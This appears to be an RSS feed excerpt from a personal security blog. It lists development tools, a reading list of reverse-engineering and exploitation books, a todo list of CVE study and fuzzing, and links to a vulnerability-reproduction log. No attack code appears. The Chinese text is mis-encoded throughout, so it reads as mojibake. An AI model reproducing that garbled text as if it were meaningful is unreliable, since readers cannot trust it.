&lt;p>&lt;code>tensorflow==2.0.0-alpha0&lt;/code>Â - ä»…æ”¯æŒ CPU çš„é¢„è§ˆ TF 2.0 Alpha ç‰ˆï¼ˆä¸ç¨³å®šï¼‰&lt;/p>
&lt;p>&lt;code>tensorflow-gpu==2.0.0-alpha0&lt;/code>Â -Â &lt;a class="link" href="https://tensorflow.google.cn/install/gpu" target="_blank" rel="noopener"
>æ”¯æŒ GPU&lt;/a>Â çš„é¢„è§ˆ TF 2.0 Alpha ç‰ˆï¼ˆä¸ç¨³å®šï¼ŒUbuntu å’Œ Windowsï¼‰&lt;/p>
&lt;h3 id="vmware-pro-è™šæ‹Ÿæœº">&lt;strong>VMware pro ï¼ˆè™šæ‹Ÿæœºï¼‰&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>è£…MacOSè®°å½•&lt;/li>
&lt;/ul>
&lt;h3 id="vbox-è™šæ‹Ÿæœº">&lt;strong>VBox ï¼ˆè™šæ‹Ÿæœºï¼‰&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>å®‰è£…æ‹“å±•åŒ…&lt;/li>
&lt;/ul>
&lt;h3 id="xshellxftp-free-for-homeschool">&lt;strong>Xshellã€Xftp (free for Home/School)&lt;/strong>&lt;/h3>
&lt;p>free çš„è¦å»&lt;a class="link" href="https://www.netsarang.com/zh/free-for-home-school/" target="_blank" rel="noopener"
>å®˜ç½‘ä¸‹è½½&lt;/a>Â å¡«å†™ä¿¡æ¯ï¼Œé‚®ç®±æ‰“å¼€é“¾æ¥ä¸‹è½½ã€‚&lt;/p>
&lt;h3 id="teamviewer-è¿œç¨‹è¿æ¥">&lt;strong>TeamViewer (è¿œç¨‹è¿æ¥)&lt;/strong>&lt;/h3>
&lt;h3 id="å„ç§ideé›†æˆç¯å¢ƒ-åªè®°å½•">&lt;strong>å„ç§IDEã€é›†æˆç¯å¢ƒ åªè®°å½•&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Visual Studio 2019&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Pycharm&lt;/p>
&lt;/li>
&lt;li>
&lt;p>IDEA&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¾®ä¿¡webå¼€å‘å·¥å…·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>phpStudy&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Android Studio (é£æ‰‡~~ ~~)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="other">&lt;strong>Other&lt;/strong>&lt;/h3>
&lt;p>ä¸åšè®°å½•&lt;/p>
&lt;h2 id="ubuntu-1804">&lt;strong>Ubuntu 18.04&lt;/strong>&lt;/h2>
&lt;blockquote>
&lt;p>ä¸€èˆ¬ç”¨æ¥è°ƒä»£ç ã€‚ å¤§éƒ¨åˆ†é…ç½®åŒä¸Šé¢WSL,åªè®°å½•ä¸åšè¿‡å¤šä»‹ç»&lt;/p>
&lt;/blockquote>
&lt;h3 id="on-my-zsh">&lt;strong>on my zsh&lt;/strong>&lt;/h3>
&lt;h3 id="gdbpwndbgpedagef">&lt;strong>gdb+pwndbg+peda+gef&lt;/strong>&lt;/h3>
&lt;h3 id="ç¾åŒ–">&lt;strong>ç¾åŒ–&lt;/strong>&lt;/h3>
&lt;h2 id="manjaro">&lt;strong>manjaro&lt;/strong>&lt;/h2>
&lt;p>å¾ˆå–œæ¬¢çš„Linuxå‘è¡Œç‰ˆã€‚åŸºäº&lt;strong>ArchLinux&lt;/strong>ï¼Œè½¯ä»¶å¤šï¼Œå¥½çœ‹åˆå¥½ç”¨ã€‚&lt;/p>
&lt;h2 id="mac-m2-æ²¡æ³•ç”¨-æ”¾å¼ƒ-ç­‰ç­‰">&lt;strong>Mac m2 æ²¡æ³•ç”¨ æ”¾å¼ƒ ç­‰ç­‰&lt;/strong>&lt;/h2>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190519150336.jpg"
loading="lazy"
alt="img"
>&lt;/p></description></item><item><title>Reading</title><link>https://ykiko.top/p/reading/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ykiko.top/p/reading/</guid><description>&lt;h1 id="reading">Reading&lt;/h1>
&lt;center>&lt;h2>ä¸ªäººæŠ€æœ¯ä¹¦å•&lt;/h2>&lt;/center>
&lt;blockquote>
&lt;p>å¤§å¤šæ•°éƒ½æ˜¯å·²ä¹°å·²çœ‹&amp;amp;å·²ä¹°æœªçœ‹&amp;amp;ç™½å«–ç”µå­ä¹¦&amp;amp;PDFxç‰ˆ&lt;/p>
&lt;/blockquote>
&lt;h3 id="è®¡ç®—æœºåŸºç¡€è¯­è¨€åŸºç¡€">&lt;strong>è®¡ç®—æœºåŸºç¡€&amp;amp;è¯­è¨€åŸºç¡€&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>æ±‡ç¼–è¯­è¨€&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C Primer plus 5&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C++ Primer plus 5&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Python æ ¸å¿ƒç¼–ç¨‹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>pythoné»‘å®¢æ”»é˜²å…¥é—¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>é”‹åˆ©çš„jquery&lt;/p>
&lt;/li>
&lt;li>
&lt;p>javascript Domç¼–ç¨‹è‰ºæœ¯&lt;/p>
&lt;/li>
&lt;li>
&lt;p>javaç¨‹åºè®¾è®¡&lt;/p>
&lt;/li>
&lt;li>
&lt;p>kotlinç¨‹åºå…¥é—¨å¼€å‘&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Windows Socket ç½‘ç»œç¼–ç¨‹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¼–ç -éšåŒ¿åœ¨è®¡ç®—æœºè½¯ç¡¬ä»¶èƒŒåçš„è¯­è¨€&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-é“¾æ¥ã€è£…è½½ä¸åº“&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¼–è¯‘åŸç†&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Linuxå†…æ ¸åˆ†æ&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="é€†å‘æ¼æ´åˆ©ç”¨">&lt;strong>é€†å‘&amp;amp;æ¼æ´åˆ©ç”¨&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>é€†å‘å·¥ç¨‹æƒå¨æŒ‡å—ï¼ˆä¸Šä¸‹ï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LinuxäºŒè¿›åˆ¶åˆ†æ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æœ‰è¶£çš„äºŒè¿›åˆ¶&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ¼æ´æˆ˜äº‰è½¯ä»¶æ¼æ´åˆ†æç²¾è¦&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C/C++å®‰å…¨ç¼–ç &lt;/p>
&lt;/li>
&lt;li>
&lt;p>å†…æ ¸æ¼æ´çš„åˆ©ç”¨ä¸é˜²èŒƒ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è½¯ä»¶è°ƒè¯•ï¼ˆç¬¬äºŒç‰ˆï¼‰ å·ä¸€ ç¡¬ä»¶åŸºç¡€&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¡¬ä»¶å®‰å…¨æ”»é˜²å¤§æ­ç§˜&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="ç§»åŠ¨å®‰å…¨å¼€å‘">&lt;strong>ç§»åŠ¨å®‰å…¨&amp;amp;å¼€å‘&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Androidè½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Androidè½¯ä»¶å®‰å…¨æ”»é˜²å®ä¾‹åˆ†æ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Androidå®‰å…¨æ”»é˜²å®æˆ˜&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Androidå®‰å…¨æ”»é˜²æƒå¨æŒ‡å—&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Androidå®‰å…¨æ”»é˜²æŒ‡å—&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>iOSåº”ç”¨é€†å‘ä¸å®‰å…¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ¸¸æˆå®‰å…¨-æ‰‹æ¸¸å®‰å…¨æŠ€æœ¯å…¥é—¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æœ€å¼ºAndroidä¹¦-æ„æ¶å¤§å‰–æ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Androidè½¯ä»¶å®‰å…¨æƒå¨æŒ‡å—&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="webå®‰å…¨æ¸—é€">&lt;strong>Webå®‰å…¨&amp;amp;æ¸—é€&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>kali-linux æ¸—é€æµ‹è¯•çš„è‰ºæœ¯&lt;/li>
&lt;/ul>
&lt;h3 id="other">&lt;strong>Other&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>é‡æ„ æ”¹å–„æ—¢æœ‰ä»£ç è®¾è®¡&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Wiresharkæ•°æ®åŒ…åˆ†æå®æˆ˜è¯¦è§£&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä»£ç æ•´æ´ä¹‹é“-ç¨‹åºå‘˜çš„èŒä¸šç´ å…»&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¿¡æ¯éšè—æŠ€æœ¯&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="å‚è€ƒé“¾æ¥">&lt;strong>å‚è€ƒé“¾æ¥&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/riusksk/secbook" target="_blank" rel="noopener"
>https://github.com/riusksk/secbook&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.anquanquan.info/shudan.html" target="_blank" rel="noopener"
>https://www.anquanquan.info/shudan.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.zhihu.com/question/21390646" target="_blank" rel="noopener"
>https://www.zhihu.com/question/21390646&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Todo</title><link>https://ykiko.top/p/todo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ykiko.top/p/todo/</guid><description>&lt;h1 id="todo">todo&lt;/h1>
&lt;hr>
&lt;p>&lt;strong>æŒç»­è¿›è¡Œçš„æ¼æ´å¤ç°è®°å½•&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>é‡æ–°æ±‡æ€»åˆ°Â &lt;a class="link" href="https://kuekiko.notion.site/0370489a3e95497aaac3cda68b895576?v=190923209288492a99fa7e1a89f6aa34" target="_blank" rel="noopener"
>Notionæ–°é“¾æ¥&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="æ‹–å»¶ç—‡æ™šæœŸæ‚£è€…æ²»ç–—è®°å½•">&lt;strong>æ‹–å»¶ç—‡æ™šæœŸæ‚£è€…æ²»ç–—è®°å½•&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ä¿æŒæ›´æ–°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ—¥å¸¸è®°å½•&lt;/p>
&lt;/li>
&lt;li>
&lt;p>CVEå­¦ä¹ â€”â€”Androidã€Linuxå†…æ ¸ã€IoT&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å°å·¥å…·å¼€å‘&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æŒç»­å­¦ä¹ Fuzzing&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è½¦è”ç½‘å®‰å…¨å­¦ä¹ ä¸­&amp;hellip;&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200630012525.png"
loading="lazy"
alt="img"
>&lt;/p></description></item><item><title>ä¸€äº›é“¾æ¥</title><link>https://ykiko.top/p/%E4%B8%80%E4%BA%9B%E9%93%BE%E6%8E%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ykiko.top/p/%E4%B8%80%E4%BA%9B%E9%93%BE%E6%8E%A5/</guid><description>&lt;h1 id="somelink">SomeLink&lt;/h1>
&lt;ol>
&lt;li>
&lt;p>æ¼æ´å¤ç°è®°å½•&lt;/p>
&lt;p>æŒç»­è¿›è¡Œçš„æ¼æ´å¤ç°è¡¨&lt;/p>
&lt;p>â†’ &lt;a class="link" href="https://kuekiko.notion.site/0370489a3e95497aaac3cda68b895576?v=190923209288492a99fa7e1a89f6aa34" target="_blank" rel="noopener"
>Notion-VUL&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¯å¢ƒè®°å½•&lt;/p>
&lt;p>é‡åˆ°çš„é—®é¢˜è®°å½•&lt;/p>
&lt;p>â†’ &lt;a class="link" href="../envrecord" >é—®é¢˜è®°å½•&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ—¥å¸¸CheckListè¡¨&lt;/p>
&lt;p>â†’ &lt;a class="link" href="https://kuekiko.notion.site/517e49ce4e934db5b9b8ff1a040f00db?v=43dbda7927534a0c97a6bc1e05a3dc9e" target="_blank" rel="noopener"
>æ—¥å¸¸checklist&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¹¦å•&lt;/p>
&lt;p>è®°å½•ä¸€ä¸‹å¹³æ—¶æ‰€çœ‹çš„ä¹¦ï¼Œå¶å°”å†™å†™æ€»ç»“&lt;/p>
&lt;p>â†’ &lt;a class="link" href="../reading" >ä¹¦å•&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¢ç¢å¿µ&lt;/p>
&lt;p>â†’ &lt;a class="link" href="../p/%e7%a2%8e%e7%a2%8e%e5%bf%b5" >ç¢ç¢å¿µ&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol></description></item></channel></rss>